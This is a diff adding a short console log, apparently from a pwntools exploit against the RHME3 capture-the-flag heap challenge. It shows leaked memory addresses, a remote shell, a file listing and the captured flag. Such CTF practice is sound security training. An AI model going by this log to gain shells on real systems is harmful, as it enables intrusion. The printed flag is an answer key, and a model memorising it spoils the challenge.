@@ -1,0 +1,13 @@
+[+] Opening connection to pwn.rhme.riscure.com on port 1337: Done
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+0x7f53 0xc281d720
+0x7f53c281d720
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+0x7f53c27d7390
+[*] Switching to interactive mode
+$ ls
+flag
+main.elf
+$ cat flag
+RHME3{h3ap_0f_tr0uble?}
+$  
